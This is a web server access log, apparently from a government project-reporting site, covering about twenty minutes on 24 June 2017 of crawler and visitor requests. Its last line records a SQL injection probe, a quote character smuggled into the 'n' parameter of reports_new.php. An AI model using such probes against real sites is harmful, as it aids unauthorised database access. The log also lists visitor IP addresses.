157.55.39.174 - - [24/Jun/2017:08:38:43 +0530] "GET /project_details_view.php?id=675 HTTP/1.1" 200 15249 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
66.249.79.17 - - [24/Jun/2017:08:38:54 +0530] "GET /detail_news.php?id=20 HTTP/1.1" 302 18268 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.17 - - [24/Jun/2017:08:38:55 +0530] "GET /logout.php HTTP/1.1" 302 369 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.17 - - [24/Jun/2017:08:38:56 +0530] "GET /index.php HTTP/1.1" 200 19482 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.93 - - [24/Jun/2017:08:41:58 +0530] "GET / HTTP/1.1" 200 19482 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.93 - - [24/Jun/2017:08:42:00 +0530] "GET /ncdma.css HTTP/1.1" 200 12640 "http://cdmindia.gov.in/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
157.55.39.239 - - [24/Jun/2017:08:42:10 +0530] "GET /project_details_view.php?id=54 HTTP/1.1" 200 15582 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
47.9.3.205 - - [24/Jun/2017:08:42:47 +0530] "GET /includes/ncdma.css HTTP/1.1" 200 13023 "https://www.google.co.in/" "Mozilla/5.0 (Linux; U; Android 4.4.4; en-us; 2014818 Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.146 Mobile Safari/537.36 XiaoMi/MiuiBrowser/8.5.9"
47.9.7.78 - - [24/Jun/2017:08:42:47 +0530] "GET /Scripts/AC_RunActiveContent.js HTTP/1.1" 200 8321 "https://www.google.co.in/" "Mozilla/5.0 (Linux; U; Android 4.4.4; en-us; 2014818 Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.146 Mobile Safari/537.36 XiaoMi/MiuiBrowser/8.5.9"
47.9.7.78 - - [24/Jun/2017:08:42:47 +0530] "GET /ncdma.css HTTP/1.1" 200 12640 "https://www.google.co.in/" "Mozilla/5.0 (Linux; U; Android 4.4.4; en-us; 2014818 Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.146 Mobile Safari/537.36 XiaoMi/MiuiBrowser/8.5.9"
47.9.3.205 - - [24/Jun/2017:08:42:48 +0530] "GET /project_details_view.php?id=917 HTTP/1.1" 200 14337 "https://www.google.co.in/" "Mozilla/5.0 (Linux; U; Android 4.4.4; en-us; 2014818 Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.146 Mobile Safari/537.36 XiaoMi/MiuiBrowser/8.5.9"
47.9.7.78 - - [24/Jun/2017:08:42:48 +0530] "GET /images/img2.jpg HTTP/1.1" 200 16276 "http://www.cdmindia.gov.in/project_details_view.php?id=917" "Mozilla/5.0 (Linux; U; Android 4.4.4; en-us; 2014818 Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.146 Mobile Safari/537.36 XiaoMi/MiuiBrowser/8.5.9"
47.9.3.205 - - [24/Jun/2017:08:42:48 +0530] "GET /images/fbg.jpg HTTP/1.1" 200 325 "http://www.cdmindia.gov.in/project_details_view.php?id=917" "Mozilla/5.0 (Linux; U; Android 4.4.4; en-us; 2014818 Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.146 Mobile Safari/537.36 XiaoMi/MiuiBrowser/8.5.9"
47.9.3.205 - - [24/Jun/2017:08:42:48 +0530] "GET /images/fdm.jpg HTTP/1.1" 200 2043 "http://www.cdmindia.gov.in/project_details_view.php?id=917" "Mozilla/5.0 (Linux; U; Android 4.4.4; en-us; 2014818 Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.146 Mobile Safari/537.36 XiaoMi/MiuiBrowser/8.5.9"
47.9.3.205 - - [24/Jun/2017:08:42:48 +0530] "GET /images/img1.jpg HTTP/1.1" 200 1251 "http://www.cdmindia.gov.in/project_details_view.php?id=917" "Mozilla/5.0 (Linux; U; Android 4.4.4; en-us; 2014818 Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.146 Mobile Safari/537.36 XiaoMi/MiuiBrowser/8.5.9"
47.9.7.78 - - [24/Jun/2017:08:42:48 +0530] "GET /images/gtz.jpg HTTP/1.1" 200 15484 "http://www.cdmindia.gov.in/project_details_view.php?id=917" "Mozilla/5.0 (Linux; U; Android 4.4.4; en-us; 2014818 Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.146 Mobile Safari/537.36 XiaoMi/MiuiBrowser/8.5.9"
47.9.3.205 - - [24/Jun/2017:08:42:48 +0530] "GET /images/img3.jpg HTTP/1.1" 200 26957 "http://www.cdmindia.gov.in/project_details_view.php?id=917" "Mozilla/5.0 (Linux; U; Android 4.4.4; en-us; 2014818 Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.146 Mobile Safari/537.36 XiaoMi/MiuiBrowser/8.5.9"
47.9.3.205 - - [24/Jun/2017:08:42:49 +0530] "GET /images/spacer.gif HTTP/1.1" 200 43 "http://www.cdmindia.gov.in/project_details_view.php?id=917" "Mozilla/5.0 (Linux; U; Android 4.4.4; en-us; 2014818 Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.146 Mobile Safari/537.36 XiaoMi/MiuiBrowser/8.5.9"
47.9.3.205 - - [24/Jun/2017:08:42:49 +0530] "GET /images/bullet1.gif HTTP/1.1" 200 67 "http://www.cdmindia.gov.in/project_details_view.php?id=917" "Mozilla/5.0 (Linux; U; Android 4.4.4; en-us; 2014818 Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.146 Mobile Safari/537.36 XiaoMi/MiuiBrowser/8.5.9"
47.9.7.78 - - [24/Jun/2017:08:42:49 +0530] "GET /images/bulllet2.gif HTTP/1.1" 200 58 "http://www.cdmindia.gov.in/project_details_view.php?id=917" "Mozilla/5.0 (Linux; U; Android 4.4.4; en-us; 2014818 Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.146 Mobile Safari/537.36 XiaoMi/MiuiBrowser/8.5.9"
47.9.3.205 - - [24/Jun/2017:08:42:49 +0530] "GET /images/bullet4.gif HTTP/1.1" 200 67 "http://www.cdmindia.gov.in/project_details_view.php?id=917" "Mozilla/5.0 (Linux; U; Android 4.4.4; en-us; 2014818 Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.146 Mobile Safari/537.36 XiaoMi/MiuiBrowser/8.5.9"
47.9.3.205 - - [24/Jun/2017:08:42:49 +0530] "GET /favicon.ico HTTP/1.1" 200 1189 "http://www.cdmindia.gov.in/project_details_view.php?id=917" "Mozilla/5.0 (Linux; U; Android 4.4.4; en-us; 2014818 Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.146 Mobile Safari/537.36 XiaoMi/MiuiBrowser/8.5.9"
157.55.39.84 - - [24/Jun/2017:08:46:01 +0530] "GET /Approved_proj_reports_list_details.php?id=1&reporttype=1&scale=&sdt=&edt=&exec=&page=4 HTTP/1.1" 200 16660 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.174 - - [24/Jun/2017:08:48:02 +0530] "GET /project_details_view.php?id=31 HTTP/1.1" 200 13806 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
64.233.173.49 - - [24/Jun/2017:08:48:18 +0530] "GET /project_details_view.php?id=1839 HTTP/1.1" 200 14071 "-" "Mozilla/5.0 (Linux; Android 6.0.1; SM-J210F Build/MMB29Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36"
64.233.173.51 - - [24/Jun/2017:08:48:19 +0530] "GET /includes/ncdma.css HTTP/1.1" 200 13023 "http://www.cdmindia.gov.in/project_details_view.php?id=1839" "Mozilla/5.0 (Linux; Android 6.0.1; SM-J210F Build/MMB29Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36"
64.233.173.51 - - [24/Jun/2017:08:48:19 +0530] "GET /images/bullet1.gif HTTP/1.1" 200 67 "http://www.cdmindia.gov.in/project_details_view.php?id=1839" "Mozilla/5.0 (Linux; Android 6.0.1; SM-J210F Build/MMB29Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36"
64.233.173.51 - - [24/Jun/2017:08:48:19 +0530] "GET /ncdma.css HTTP/1.1" 200 12640 "http://www.cdmindia.gov.in/project_details_view.php?id=1839" "Mozilla/5.0 (Linux; Android 6.0.1; SM-J210F Build/MMB29Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36"
64.233.173.49 - - [24/Jun/2017:08:48:19 +0530] "GET /images/bullet4.gif HTTP/1.1" 200 67 "http://www.cdmindia.gov.in/project_details_view.php?id=1839" "Mozilla/5.0 (Linux; Android 6.0.1; SM-J210F Build/MMB29Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36"
64.233.173.49 - - [24/Jun/2017:08:48:19 +0530] "GET /Scripts/AC_RunActiveContent.js HTTP/1.1" 200 8321 "http://www.cdmindia.gov.in/project_details_view.php?id=1839" "Mozilla/5.0 (Linux; Android 6.0.1; SM-J210F Build/MMB29Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36"
64.233.173.51 - - [24/Jun/2017:08:48:19 +0530] "GET /images/bulllet2.gif HTTP/1.1" 200 58 "http://www.cdmindia.gov.in/project_details_view.php?id=1839" "Mozilla/5.0 (Linux; Android 6.0.1; SM-J210F Build/MMB29Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36"
64.233.173.51 - - [24/Jun/2017:08:48:19 +0530] "GET /images/img2.jpg HTTP/1.1" 200 16276 "http://www.cdmindia.gov.in/project_details_view.php?id=1839" "Mozilla/5.0 (Linux; Android 6.0.1; SM-J210F Build/MMB29Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36"
64.233.173.53 - - [24/Jun/2017:08:48:19 +0530] "GET /images/spacer.gif HTTP/1.1" 200 43 "http://www.cdmindia.gov.in/project_details_view.php?id=1839" "Mozilla/5.0 (Linux; Android 6.0.1; SM-J210F Build/MMB29Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36"
64.233.173.53 - - [24/Jun/2017:08:48:19 +0530] "GET /images/fdm.jpg HTTP/1.1" 200 2043 "http://www.cdmindia.gov.in/project_details_view.php?id=1839" "Mozilla/5.0 (Linux; Android 6.0.1; SM-J210F Build/MMB29Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36"
64.233.173.51 - - [24/Jun/2017:08:48:19 +0530] "GET /images/gtz.jpg HTTP/1.1" 200 15484 "http://www.cdmindia.gov.in/project_details_view.php?id=1839" "Mozilla/5.0 (Linux; Android 6.0.1; SM-J210F Build/MMB29Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36"
64.233.173.53 - - [24/Jun/2017:08:48:19 +0530] "GET /images/img3.jpg HTTP/1.1" 200 26957 "http://www.cdmindia.gov.in/project_details_view.php?id=1839" "Mozilla/5.0 (Linux; Android 6.0.1; SM-J210F Build/MMB29Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36"
64.233.173.51 - - [24/Jun/2017:08:48:19 +0530] "GET /images/img1.jpg HTTP/1.1" 200 1251 "http://www.cdmindia.gov.in/project_details_view.php?id=1839" "Mozilla/5.0 (Linux; Android 6.0.1; SM-J210F Build/MMB29Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36"
64.233.173.51 - - [24/Jun/2017:08:48:19 +0530] "GET /images/fbg.jpg HTTP/1.1" 200 325 "http://www.cdmindia.gov.in/project_details_view.php?id=1839" "Mozilla/5.0 (Linux; Android 6.0.1; SM-J210F Build/MMB29Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36"
64.233.173.49 - - [24/Jun/2017:08:48:20 +0530] "GET /favicon.ico HTTP/1.1" 200 1189 "http://www.cdmindia.gov.in/project_details_view.php?id=1839" "Mozilla/5.0 (Linux; Android 6.0.1; SM-J210F Build/MMB29Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36"
47.247.11.207 - - [24/Jun/2017:08:49:53 +0530] "GET /project_details_view.php?id=2081 HTTP/1.1" 200 14235 "http://www.google.co.in/search?ei=IvZMWdG8CordvgSjnZaICQ&q=alfa+solar+power&oq=alfa+solar+piwer&gs_l=mobile-gws-serp.1.0.0i13k1.3766.30934.0.33239.35.25.0.5.5.0.325.5716.0j5j17j2.24.0....0...1.1.64.mobile-gws-serp..18.17.3251.1..0j41j0i67k1j0i2i159i67k1j0i10k1j0i22i30k1j0i22i10i30k1j33i21k1.wH1oBrOuCNM" "Mozilla/5.0 (Linux; U; Android 4.4.4; en-us; Lenovo A6000 Build/KTU84P) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 UCBrowser/9.7.5.418 U3/0.8.0 Mobile Safari/533.1"
47.247.11.207 - - [24/Jun/2017:08:49:53 +0530] "GET /ncdma.css HTTP/1.1" 200 12640 "http://www.cdmindia.gov.in/project_details_view.php?id=2081" "Mozilla/5.0 (Linux; U; Android 4.4.4; en-us; Lenovo A6000 Build/KTU84P) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 UCBrowser/9.7.5.418 U3/0.8.0 Mobile Safari/533.1"
47.247.11.207 - - [24/Jun/2017:08:49:53 +0530] "GET /includes/ncdma.css HTTP/1.1" 200 13023 "http://www.cdmindia.gov.in/project_details_view.php?id=2081" "Mozilla/5.0 (Linux; U; Android 4.4.4; en-us; Lenovo A6000 Build/KTU84P) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 UCBrowser/9.7.5.418 U3/0.8.0 Mobile Safari/533.1"
47.247.11.207 - - [24/Jun/2017:08:49:53 +0530] "GET /Scripts/AC_RunActiveContent.js HTTP/1.1" 200 8321 "http://www.cdmindia.gov.in/project_details_view.php?id=2081" "Mozilla/5.0 (Linux; U; Android 4.4.4; en-us; Lenovo A6000 Build/KTU84P) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 UCBrowser/9.7.5.418 U3/0.8.0 Mobile Safari/533.1"
47.247.11.207 - - [24/Jun/2017:08:49:53 +0530] "GET /images/img1.jpg HTTP/1.1" 200 1251 "http://www.cdmindia.gov.in/project_details_view.php?id=2081" "Mozilla/5.0 (Linux; U; Android 4.4.4; en-us; Lenovo A6000 Build/KTU84P) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 UCBrowser/9.7.5.418 U3/0.8.0 Mobile Safari/533.1"
47.247.11.207 - - [24/Jun/2017:08:49:53 +0530] "GET /images/img2.jpg HTTP/1.1" 200 16276 "http://www.cdmindia.gov.in/project_details_view.php?id=2081" "Mozilla/5.0 (Linux; U; Android 4.4.4; en-us; Lenovo A6000 Build/KTU84P) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 UCBrowser/9.7.5.418 U3/0.8.0 Mobile Safari/533.1"
47.247.11.207 - - [24/Jun/2017:08:49:53 +0530] "GET /images/img3.jpg HTTP/1.1" 200 26957 "http://www.cdmindia.gov.in/project_details_view.php?id=2081" "Mozilla/5.0 (Linux; U; Android 4.4.4; en-us; Lenovo A6000 Build/KTU84P) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 UCBrowser/9.7.5.418 U3/0.8.0 Mobile Safari/533.1"
47.247.11.207 - - [24/Jun/2017:08:49:53 +0530] "GET /images/fdm.jpg HTTP/1.1" 200 2043 "http://www.cdmindia.gov.in/project_details_view.php?id=2081" "Mozilla/5.0 (Linux; U; Android 4.4.4; en-us; Lenovo A6000 Build/KTU84P) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 UCBrowser/9.7.5.418 U3/0.8.0 Mobile Safari/533.1"
47.247.11.207 - - [24/Jun/2017:08:49:53 +0530] "GET /images/bulllet2.gif HTTP/1.1" 200 58 "http://www.cdmindia.gov.in/project_details_view.php?id=2081" "Mozilla/5.0 (Linux; U; Android 4.4.4; en-us; Lenovo A6000 Build/KTU84P) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 UCBrowser/9.7.5.418 U3/0.8.0 Mobile Safari/533.1"
47.247.11.207 - - [24/Jun/2017:08:49:53 +0530] "GET /images/spacer.gif HTTP/1.1" 200 43 "http://www.cdmindia.gov.in/project_details_view.php?id=2081" "Mozilla/5.0 (Linux; U; Android 4.4.4; en-us; Lenovo A6000 Build/KTU84P) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 UCBrowser/9.7.5.418 U3/0.8.0 Mobile Safari/533.1"
47.247.11.207 - - [24/Jun/2017:08:49:53 +0530] "GET /images/gtz.jpg HTTP/1.1" 200 15484 "http://www.cdmindia.gov.in/project_details_view.php?id=2081" "Mozilla/5.0 (Linux; U; Android 4.4.4; en-us; Lenovo A6000 Build/KTU84P) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 UCBrowser/9.7.5.418 U3/0.8.0 Mobile Safari/533.1"
47.247.11.207 - - [24/Jun/2017:08:49:53 +0530] "GET /images/bullet4.gif HTTP/1.1" 200 67 "http://www.cdmindia.gov.in/project_details_view.php?id=2081" "Mozilla/5.0 (Linux; U; Android 4.4.4; en-us; Lenovo A6000 Build/KTU84P) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 UCBrowser/9.7.5.418 U3/0.8.0 Mobile Safari/533.1"
47.247.11.207 - - [24/Jun/2017:08:49:53 +0530] "GET /images/bullet1.gif HTTP/1.1" 200 67 "http://www.cdmindia.gov.in/project_details_view.php?id=2081" "Mozilla/5.0 (Linux; U; Android 4.4.4; en-us; Lenovo A6000 Build/KTU84P) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 UCBrowser/9.7.5.418 U3/0.8.0 Mobile Safari/533.1"
47.247.11.207 - - [24/Jun/2017:08:49:54 +0530] "GET /images/fbg.jpg HTTP/1.1" 200 325 "http://www.cdmindia.gov.in/project_details_view.php?id=2081" "Mozilla/5.0 (Linux; U; Android 4.4.4; en-us; Lenovo A6000 Build/KTU84P) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 UCBrowser/9.7.5.418 U3/0.8.0 Mobile Safari/533.1"
47.247.11.207 - - [24/Jun/2017:08:49:54 +0530] "GET /images/favicon.ico HTTP/1.1" 200 1406 "http://www.cdmindia.gov.in/project_details_view.php?id=2081" "Mozilla/5.0 (Linux; U; Android 4.4.4; en-us; Lenovo A6000 Build/KTU84P) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 UCBrowser/9.7.5.418 U3/0.8.0 Mobile Safari/533.1"
64.233.173.51 - - [24/Jun/2017:08:50:18 +0530] "GET /project_details_view.php?id=1839 HTTP/1.1" 200 14071 "-" "Mozilla/5.0 (Linux; Android 6.0.1; SM-J210F Build/MMB29Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36"
64.233.173.49 - - [24/Jun/2017:08:50:35 +0530] "GET /reports_new.php?n=1 HTTP/1.1" 200 22413 "http://www.cdmindia.gov.in/project_details_view.php?id=1839" "Mozilla/5.0 (Linux; Android 6.0.1; SM-J210F Build/MMB29Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36"
64.233.173.51 - - [24/Jun/2017:08:50:36 +0530] "GET /js/user_registration.js HTTP/1.1" 200 26819 "http://www.cdmindia.gov.in/reports_new.php?n=1" "Mozilla/5.0 (Linux; Android 6.0.1; SM-J210F Build/MMB29Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36"
64.233.173.49 - - [24/Jun/2017:08:50:57 +0530] "GET /aboutus.php HTTP/1.1" 200 19599 "http://www.cdmindia.gov.in/reports_new.php?n=1" "Mozilla/5.0 (Linux; Android 6.0.1; SM-J210F Build/MMB29Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36"
64.233.173.51 - - [24/Jun/2017:08:50:58 +0530] "GET /images/login1.jpg HTTP/1.1" 200 618 "http://www.cdmindia.gov.in/aboutus.php" "Mozilla/5.0 (Linux; Android 6.0.1; SM-J210F Build/MMB29Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36"
64.233.173.53 - - [24/Jun/2017:08:50:58 +0530] "GET /images/login.jpg HTTP/1.1" 200 1044 "http://www.cdmindia.gov.in/aboutus.php" "Mozilla/5.0 (Linux; Android 6.0.1; SM-J210F Build/MMB29Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36"
64.233.173.53 - - [24/Jun/2017:08:50:58 +0530] "GET /images/h_aboutus.jpg HTTP/1.1" 200 21693 "http://www.cdmindia.gov.in/aboutus.php" "Mozilla/5.0 (Linux; Android 6.0.1; SM-J210F Build/MMB29Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36"
64.233.173.51 - - [24/Jun/2017:08:50:58 +0530] "GET /images/fe.jpg HTTP/1.1" 200 1429 "http://www.cdmindia.gov.in/aboutus.php" "Mozilla/5.0 (Linux; Android 6.0.1; SM-J210F Build/MMB29Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36"
64.233.173.49 - - [24/Jun/2017:08:50:58 +0530] "GET /images/bullet3.gif HTTP/1.1" 200 58 "http://www.cdmindia.gov.in/aboutus.php" "Mozilla/5.0 (Linux; Android 6.0.1; SM-J210F Build/MMB29Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36"
64.233.173.47 - - [24/Jun/2017:08:51:48 +0530] "GET /reports_new.php?n=1 HTTP/1.1" 200 22413 "http://www.cdmindia.gov.in/project_details_view.php?id=1839" "Mozilla/5.0 (Linux; Android 6.0.1; SM-J210F Build/MMB29Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36"
64.233.173.49 - - [24/Jun/2017:08:51:59 +0530] "GET /project_details_view.php?id=1839 HTTP/1.1" 200 14071 "-" "Mozilla/5.0 (Linux; Android 6.0.1; SM-J210F Build/MMB29Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36"
202.46.56.17 - - [24/Jun/2017:08:53:58 +0530] "GET /project_details_view_report.php?id=402 HTTP/1.1" 200 13155 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36"
66.249.69.83 - - [24/Jun/2017:08:54:40 +0530] "GET /project_details_view_report.php?id=1771 HTTP/1.1" 200 13240 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
35.184.189.105 - - [24/Jun/2017:08:56:04 +0530] "GET /robots.txt HTTP/1.1" 404 208 "-" "ltx71 - (http://ltx71.com/)"
223.186.107.187 - - [24/Jun/2017:09:00:44 +0530] "GET /project_details_view.php?id=894 HTTP/1.1" 200 15171 "https://www.google.co.in/" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0"
223.186.107.187 - - [24/Jun/2017:09:00:45 +0530] "GET /includes/ncdma.css HTTP/1.1" 200 13023 "http://www.cdmindia.gov.in/project_details_view.php?id=894" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0"
223.186.107.187 - - [24/Jun/2017:09:00:45 +0530] "GET /Scripts/AC_RunActiveContent.js HTTP/1.1" 200 8321 "http://www.cdmindia.gov.in/project_details_view.php?id=894" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0"
223.186.107.187 - - [24/Jun/2017:09:00:45 +0530] "GET /ncdma.css HTTP/1.1" 200 12640 "http://www.cdmindia.gov.in/project_details_view.php?id=894" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0"
223.186.107.187 - - [24/Jun/2017:09:00:45 +0530] "GET /images/img2.jpg HTTP/1.1" 200 16276 "http://www.cdmindia.gov.in/project_details_view.php?id=894" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0"
223.186.107.187 - - [24/Jun/2017:09:00:45 +0530] "GET /images/img3.jpg HTTP/1.1" 200 26957 "http://www.cdmindia.gov.in/project_details_view.php?id=894" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0"
223.186.107.187 - - [24/Jun/2017:09:00:45 +0530] "GET /images/spacer.gif HTTP/1.1" 200 43 "http://www.cdmindia.gov.in/project_details_view.php?id=894" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0"
223.186.107.187 - - [24/Jun/2017:09:00:45 +0530] "GET /images/bullet1.gif HTTP/1.1" 200 67 "http://www.cdmindia.gov.in/project_details_view.php?id=894" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0"
223.186.107.187 - - [24/Jun/2017:09:00:45 +0530] "GET /images/bulllet2.gif HTTP/1.1" 200 58 "http://www.cdmindia.gov.in/project_details_view.php?id=894" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0"
223.186.107.187 - - [24/Jun/2017:09:00:45 +0530] "GET /images/bullet4.gif HTTP/1.1" 200 67 "http://www.cdmindia.gov.in/project_details_view.php?id=894" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0"
223.186.107.187 - - [24/Jun/2017:09:00:46 +0530] "GET /images/img1.jpg HTTP/1.1" 200 1251 "http://www.cdmindia.gov.in/project_details_view.php?id=894" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0"
223.186.107.187 - - [24/Jun/2017:09:00:46 +0530] "GET /images/favicon.ico HTTP/1.1" 200 1406 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0"
223.186.107.187 - - [24/Jun/2017:09:00:46 +0530] "GET /images/gtz.jpg HTTP/1.1" 200 15484 "http://www.cdmindia.gov.in/project_details_view.php?id=894" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0"
223.186.107.187 - - [24/Jun/2017:09:00:46 +0530] "GET /images/fbg.jpg HTTP/1.1" 200 325 "http://www.cdmindia.gov.in/project_details_view.php?id=894" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0"
223.186.107.187 - - [24/Jun/2017:09:00:46 +0530] "GET /images/fdm.jpg HTTP/1.1" 200 2043 "http://www.cdmindia.gov.in/project_details_view.php?id=894" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0"
45.36.196.7 - - [24/Jun/2017:09:02:59 +0530] "GET /reports_new.php?n=1'A=0 HTTP/1.1" 200 22413 "http://www.cdmindia.gov.in/reports_new.php?n=1'A=0" "Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-PT; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)"
